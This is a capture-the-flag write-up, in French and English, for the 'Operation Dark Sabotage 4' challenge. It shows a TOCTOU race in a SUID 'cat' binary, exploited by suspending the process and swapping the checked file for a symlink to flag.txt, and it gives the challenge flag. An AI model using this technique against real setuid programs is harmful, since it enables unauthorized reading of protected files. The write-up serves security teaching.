# Operation Dark Sabotage 4

## Write-up FR

On constate que le binaire `cat` est un exécutable `SUID`, ce qui suggère qu'il peut être exploité.

En l'analysant avec Ghidra, on observe qu'il prend en argument un fichier et utilise `access` pour vérifier si l'on a la permission d'y accéder :
```c
iVar1 = access((char *)param_2[1],2);
if (iVar1 == 0) {
        ...
}else{
        fprintf(stderr,"%s: %s: Permission denied\n",*param_2,param_2[1]);
}
```
Le programme nous propose ensuite plusieurs choix : afficher la taille du fichier, voir ses permissions ou lire son contenu.
Cependant, en raison de la vérification via `access`, il nous est impossible de lire un fichier auquel nous n'avons pas accès :
```bash
$ ./cat flag.txt 
./cat: flag.txt: Permission denied
```
On remarque une race condition entre la vérification d'accès (`access`) et la prise en compte de notre choix (`scanf`).
Étant donné que le contrôle d'accès se fait avant que l'utilisateur ne sélectionne son action, nous avons une fenêtre de temps pour remplacer le fichier passé en argument par un lien symbolique pointant vers `flag.txt` :
```bash
$ touch toto
$ ./cat toto
Choice: 
        [1] Display file size
        [2] Display file permission
        [3] Display file content
 -> ^Z
[1]+  Stopped                 ./cat toto
$ rm toto 
$ ln -s flag.txt toto
$ fg
./cat toto
3
polycyber{d34th_t0_th3_3mp1r3}
```

## Write-up EN

We notice that the `cat` binary is a `SUID` executable, which suggests it can be exploited.

Analyzing it with Ghidra, we observe that it takes a file as an argument and uses access to check if the user has permission to access it :
```c
iVar1 = access((char *)param_2[1],2);
if (iVar1 == 0) {
        ...
}else{
        fprintf(stderr,"%s: %s: Permission denied\n",*param_2,param_2[1]);
}
```
The program then presents several options: displaying the file size, viewing its permissions, or reading its content.
However, due to the `access` check, we are unable to read a file we do not have permission for :
```bash
$ ./cat flag.txt 
./cat: flag.txt: Permission denied
```
We notice a race condition between the access check (`access`) and the user input handling (`scanf`).
Since the access check is performed before the user selects an option, there is a time window in which we can replace the provided file with a symbolic link to `flag.txt` :
```bash
$ touch toto
$ ./cat toto
Choice: 
        [1] Display file size
        [2] Display file permission
        [3] Display file content
 -> ^Z
[1]+  Stopped                 ./cat toto
$ rm toto 
$ ln -s flag.txt toto
$ fg
./cat toto
3
polycyber{d34th_t0_th3_3mp1r3}
```

## Flag

`polycyber{d34th_t0_th3_3mp1r3}`